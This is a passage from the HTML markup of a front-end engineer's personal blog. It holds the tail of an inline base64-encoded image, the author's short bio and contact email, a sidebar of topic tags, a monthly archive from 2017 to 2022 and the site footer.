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"></div><div class="u-author_tit"><p>My name is Micheal Wayne and this is my blog.<br>I am a front-end software engineer.<br>Contact: <a href="mailto:michealwayne@163.com"> <span>michealwayne@163.com</span></a></p></div></div></div></div><div class="tag-lists widget"><h3 class="widget-title"> Tags</h3><div class="widget-content"><ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/APM/">APM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/BOM/">BOM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bun/">Bun</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DOM/">DOM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTML/">HTML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/OKR/">OKR</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/React/">React</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UML/">UML</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/UX/">UX</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Vue/">Vue</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WebSocket/">WebSocket</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Zepto/">Zepto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/canvas/">canvas</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/css/">css</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/es6/">es6</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/eslint/">eslint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/h5/">h5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http/">http</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jQuery/">jQuery</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js/">js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lerna/">lerna</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lottie/">lottie</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs/">nodejs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/prettier/">prettier</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/react/">react</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/serviceWorker/">serviceWorker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sketch/">sketch</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/skywalking/">skywalking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/taro/">taro</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tslint/">tslint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/typescript/">typescript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webApi/">webApi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webpack/">webpack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码规范/">代码规范</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/前端/">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/动效/">动效</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/图形处理/">图形处理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/安全/">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/小程序/">小程序</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/工具/">工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/工程/">工程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/微前端/">微前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/思维逻辑/">思维逻辑</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/性能/">性能</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/架构/">架构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/概念/">概念</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/浏览器/">浏览器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/用户体验/">用户体验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/笔记/">笔记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编码/">编码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网络/">网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/网络协议/">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/设计模式/">设计模式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/调试/">调试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/质量/">质量</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/软件工程/">软件工程</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/项目管理/">项目管理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/高并发/">高并发</a></li></ul></div></div><div class="archive-lists widget"><h3 class="widget-title"> Archive</h3><div class="widget-content"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">April 2018</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a><span class="archive-list-count">5</span></li></ul></div></div></div></div></div><footer><div class="copyright"><div class="container"><div class="col-6"><div class="site-info">© 2016 - 2022 <a href="http://blog.michealwayne.cn">Micheal Wayne</a></div></div><div class="col-6"><div class="site-contact"><div class="social-links"><ul><li class="social-link"><a href="http://github.com/MichealWayne" target="_blank" class="link-github"><i class="icon icon-github"></i></a></li><li class="social-link"><a href="mailto:michealwayne@163.com" target="_self" class="link-mail"><i class="icon icon-mail"></i></a></li></ul></div></div></div></div></div></footer><a class="scroll-up"><span class="icon icon-up"></span></a><script 